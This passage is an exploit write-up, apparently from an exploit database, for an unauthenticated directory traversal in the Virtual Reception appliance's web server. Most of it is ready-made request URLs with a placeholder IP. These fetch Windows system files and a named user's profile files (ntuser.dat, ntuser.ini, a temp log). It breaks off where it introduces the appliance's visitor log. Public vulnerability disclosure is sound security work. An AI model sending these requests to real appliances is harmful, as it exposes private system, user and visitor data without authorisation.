# Exploit Title: Virtual Reception v1.0 - Web Server Directory Traversal
# Exploit Author: Spinae
# Vendor Homepage: https://www.virtualreception.nl/
# Version: win7sp1_rtm.101119-1850 6.1.7601.1.0.65792 running on an Intel NUC5i5RY
# Tested on: all

We discovered the web server of the Virtual Reception appliance is prone to
an unauthenticated directory traversal vulnerability. This allows an
attacker to traverse outside the server root directory by specifying files
at the end of a URL request.
This is a NUC5i5RY

http://[ip address]/c:/WINDOWS/System32/drivers/etc/hosts
http://[ip address]/C:/windows/WindowsUpdate.log
...

A user called 'receptie' exists on the Windows system:

http://[ip address]/c:/users/receptie/ntuser.dat
http://[ip address]/c:/users/receptie/ntuser.ini
http://[ip address]/c:/users/receptie/appdata/local/temp/wmsetup.log

The appliance also keeps a log of the visitors that register at the
entrance:
